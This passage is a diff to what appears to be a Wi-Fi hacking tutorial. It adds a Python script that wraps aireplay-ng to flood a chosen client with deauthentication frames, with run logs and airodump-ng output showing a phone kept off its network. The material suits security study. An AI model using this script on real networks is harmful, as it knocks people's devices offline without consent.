@@ -204,3 +204,71 @@
     ```
 
     ![Screenshot of mobile trying to reconnect to the network](../imgs/WhatsApp%20Image%202025-07-26%20at%2007.47.53.jpeg)
+
+- Let's write down a Python script to automate this process of deauthentication attack. The script will take the wireless interface name, target client MAC address, and gateway (AP) MAC address as input and perform the deauthentication attack.
+
+    ```python
+    # Deauthentication Attack Script
+    # This script performs a deauthentication attack on a specified Wi-Fi network.
+
+    import os
+    import subprocess
+    def deauth_attack(interface, target_mac, gateway_mac):
+        print(f"[+] Starting deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
+        
+        # Construct the command for the deauthentication attack
+        command = [
+            "sudo", "aireplay-ng", "--deauth", "100000000", "-a", gateway_mac, "-c", target_mac, interface
+        ]
+        
+        # Execute the command
+        subprocess.call(command)
+        
+        
+    # Example usage
+    if __name__ == "__main__":
+        # Fetch the interface name using iwconfig command
+        interface = input("Enter the interface name (e.g., wlan0): ")
+        target_mac = input("Enter the target MAC address (victim): ")
+        gateway_mac = input("Enter the gateway (AP) MAC address: ")
+        print(f"[+] Initiating Deauthentication attack on {target_mac} via {gateway_mac} using {interface}")
+        deauth_attack(interface, target_mac, gateway_mac)
+        print("[+] Deauthentication attack completed")
+        
+    ```
+
+    Python Script logs:
+
+    ```bash
+    (.venv) root@kali:~/PycharmProjects/hacking-tutorial# python deauth_attack.py 
+    Enter the interface name (e.g., wlan0): wlan0
+    Enter the target MAC address (victim): MOBILE_MAC
+    Enter the gateway (AP) MAC address: WIFI_MAC
+    [+] Initiating Deauthentication attack on MOBILE_MAC via WIFI_MAC using wlan0
+    [+] Starting deauthentication attack on MOBILE_MAC via WIFI_MAC using wlan0
+    23:31:45  Waiting for beacon frame (BSSID: D8:47:32:79:B5:44) on channel 36
+    23:31:45  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [51|69 ACKs]
+    23:31:46  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|63 ACKs]
+    23:31:47  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|63 ACKs]
+    23:31:47  Sending 64 directed DeAuth (code 7). STMAC: [MOBILE_MAC] [ 0|63 ACKs]
+    ```
+
+    `airodump-ng` output:
+
+    ```bash
+    root@kali:~# airodump-ng --bssid WIFI_MAC --channel 36 wlan0
+    CH 36 ][ Elapsed: 1 min ][ 2025-07-25 23:31 
+
+    BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+    WIFI_MAC  -19  58      926       98    0  36  780   WPA2 CCMP   PSK  ACT-ai_102739915390       
+
+    BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+    WIFI_MAC  DEVICE1_MAC  -45    6e- 6e     0      159                                       
+    WIFI_MAC  DEVICE2_MAC  -27    6e-24      0      224                                       
+    WIFI_MAC  MOBILE_MAC  -25    6e- 1e  1696     1347         WIFI_NAME           
+    Quitting...
+    ```
+
+- The `Probe` showing the `WIFI_NAME` is the mobile trying to reconnect to the network, and it is sending probe requests to the network, but it is not able to connect to the network because we have disconnected it using the deauthentication attack.
